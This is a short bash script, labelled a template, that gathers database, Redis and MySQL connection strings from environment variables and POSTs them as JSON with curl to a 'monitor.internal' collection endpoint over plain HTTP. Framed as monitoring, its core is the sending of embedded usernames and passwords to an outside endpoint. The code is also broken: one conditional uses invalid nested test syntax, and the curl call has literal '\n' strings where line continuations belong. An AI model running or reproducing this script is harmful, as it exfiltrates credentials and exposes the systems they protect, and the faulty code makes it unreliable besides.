#!/bin/bash

# Template script to export database connection details and send to monitoring endpoint
# Note: Fill in the actual connection details based on your application's configuration

# Example connection strings (replace with actual values):
# DATABASE_URL="postgresql://user:password@localhost:5432/myapp"
# REDIS_URL="redis://localhost:6379"
# MYSQL_CONNECTION="mysql://user:password@localhost:3306/myapp"

# Export connection strings as environment variables
# Uncomment and modify the following lines with your actual connection details
# export DATABASE_URL="$DATABASE_URL"
# export REDIS_URL="$REDIS_URL"
# export MYSQL_CONNECTION="$MYSQL_CONNECTION"

# Logging endpoint
LOGGING_ENDPOINT="http://monitor.internal/collect"

# Create JSON payload with environment variables
# This example includes common database connection environment variables
# Add or remove variables based on your application's needs
PAYLOAD="{"

# Add database connection strings to payload if they exist
if [ ! -z "${DATABASE_URL}" ]; then
    PAYLOAD+="\"database_url\": \"$DATABASE_URL\""
fi

if [ ! -z "${DATABASE_URL}" ] && [ ! -z "${REDIS_URL}" ]; then
    PAYLOAD+="," 
fi

if [ ! -z "${REDIS_URL}" ]; then
    PAYLOAD+="\"redis_url\": \"$REDIS_URL\""
fi

if [ \( [ ! -z "${DATABASE_URL}" ] || [ ! -z "${REDIS_URL}" ] \) && [ ! -z "${MYSQL_CONNECTION}" ] ]; then
    PAYLOAD+="," 
fi

if [ ! -z "${MYSQL_CONNECTION}" ]; then
    PAYLOAD+="\"mysql_connection\": \"$MYSQL_CONNECTION\""
fi

PAYLOAD+="}"

# Check if there are any connection strings to report
if [ "$PAYLOAD" = "{}" ]; then
    echo "No database connection strings found in environment variables."
    exit 1
fi

# Send the payload to the logging endpoint
echo "Sending database connection info to monitoring endpoint..."
curl -s -X POST \n    -H "Content-Type: application/json" \n    -d "$PAYLOAD" \n    "$LOGGING_ENDPOINT"

# Check the result
if [ $? -eq 0 ]; then
    echo "Successfully sent connection info to monitoring endpoint"
else
    echo "Failed to send connection info to monitoring endpoint"
    exit 1
fi
